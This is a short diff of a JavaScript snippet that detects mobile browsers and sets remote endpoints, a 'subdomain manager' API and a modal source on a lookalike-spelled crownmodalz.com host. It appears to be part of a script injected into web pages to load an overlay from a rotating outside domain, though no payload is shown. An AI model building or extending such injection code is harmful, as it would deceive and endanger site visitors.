@@ -1,10 +1,9 @@
 (async () => {
     // Check for mobile device
-    
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     
     // API endpoints
-    const subdomainApi = "https://funbIicnk.crownbackendz.com"; // Your subdomain manager
+    const subdomainApi = "https://encode-domain.com"; // Your subdomain manager
     const src = "https://funbIicnk.crownmodalz.com/";
     
     // Simple modal HTML
